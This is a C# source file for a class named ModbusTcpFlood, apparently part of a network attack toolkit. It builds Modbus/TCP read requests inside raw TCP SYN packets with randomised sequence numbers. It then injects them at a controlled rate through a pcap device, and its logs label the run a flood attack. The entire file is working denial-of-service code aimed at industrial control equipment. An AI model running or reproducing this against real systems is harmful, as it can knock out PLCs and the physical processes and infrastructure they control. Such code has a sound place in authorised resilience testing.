using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{

    public class ModbusTcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        private readonly Random _random = new Random();
        public event EventHandler<PacketEventArgs>? PacketSent;

        public byte UnitId { get; set; } = 1;

        public byte FunctionCode { get; set; } = 0x03;

        public ushort StartAddress { get; set; } = 0;

        public ushort Quantity { get; set; } = 1;

        public ModbusTcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        private byte[] BuildModbusTcpPayload()
        {

            byte[] pdu = new byte[5];
            pdu[0] = FunctionCode;

            byte[] addressBytes = BitConverter.GetBytes(StartAddress);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(addressBytes);
            pdu[1] = addressBytes[0];
            pdu[2] = addressBytes[1];

            byte[] quantityBytes = BitConverter.GetBytes(Quantity);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(quantityBytes);
            pdu[3] = quantityBytes[0];
            pdu[4] = quantityBytes[1];

            byte[] adu = new byte[7 + pdu.Length];
            ushort transactionId = (ushort)_random.Next(1, 65536);
            ushort protocolId = 0x0000;
            ushort length = (ushort)(1 + pdu.Length);

            byte[] transIdBytes = BitConverter.GetBytes(transactionId);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(transIdBytes);
            adu[0] = transIdBytes[0];
            adu[1] = transIdBytes[1];

            byte[] protoIdBytes = BitConverter.GetBytes(protocolId);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(protoIdBytes);
            adu[2] = protoIdBytes[0];
            adu[3] = protoIdBytes[1];

            byte[] lengthBytes = BitConverter.GetBytes(length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(lengthBytes);
            adu[4] = lengthBytes[0];
            adu[5] = lengthBytes[1];

            adu[6] = UnitId;

            Array.Copy(pdu, 0, adu, 7, pdu.Length);

            return adu;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting Modbus/TCP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr =>
                        addr.Addr.ipAddress != null &&
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                IInjectionDevice? injectionDevice = _device as IInjectionDevice;
                bool useInjection = injectionDevice != null;

                if (!useInjection)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                byte[] modbusPayload = BuildModbusTcpPayload();

                Logger.Info($"Modbus/TCP payload size: {modbusPayload.Length} bytes, Function Code: 0x{FunctionCode:X2}, Unit ID: {UnitId}");

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,
                    WindowSize = 8192,
                    SequenceNumber = 0
                };

                tcpPacket.PayloadData = modbusPayload;

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                int actualPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    for (int i = 0; i < batchSize; i++)
                    {

                        byte[] newModbusPayload = BuildModbusTcpPayload();
                        tcpPacket.PayloadData = newModbusPayload;

                        _random.NextBytes(bytes);
                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);

                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                    }

                    int wirePacketSize = actualPacketSize + 4;
                    long targetBytesPerSecond = _params.BytesPerSecond;
                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;

                    Logger.Info($"Modbus/TCP packet wire size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");

                    long bytesSent = 0;
                    var currentBatch = 0;

                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500;
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3;

                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0;

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {

                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);

                            if (bytesSent < allowedBytes)
                            {

                                long bytesBehind = allowedBytes - bytesSent;
                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10);
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, maxBurst);

                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    var packet = packetPool[currentBatch];
                                    injectionDevice!.SendPacket(packet);
                                    OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);

                                    bytesSent += wirePacketSize;
                                    currentBatch++;

                                    if (currentBatch >= batchSize)
                                    {

                                        int regenerateCount = Math.Min(100, batchSize);
                                        for (int j = 0; j < regenerateCount; j++)
                                        {

                                            byte[] newModbusPayload = BuildModbusTcpPayload();
                                            tcpPacket.PayloadData = newModbusPayload;

                                            _random.NextBytes(bytes);
                                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);

                                            tcpPacket.UpdateCalculatedValues();
                                            ipPacket.UpdateCalculatedValues();
                                            packetPool[j] = ethernetPacket.Bytes;
                                        }
                                        currentBatch = 0;
                                    }
                                }
                            }
                            else
                            {

                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {

                                    Thread.Sleep(0);
                                }
                                else
                                {

                                    Thread.SpinWait(10);
                                }
                            }

                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;

                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);

                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);

                                Logger.Info($"Modbus/TCP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");

                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending Modbus/TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Modbus/TCP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}

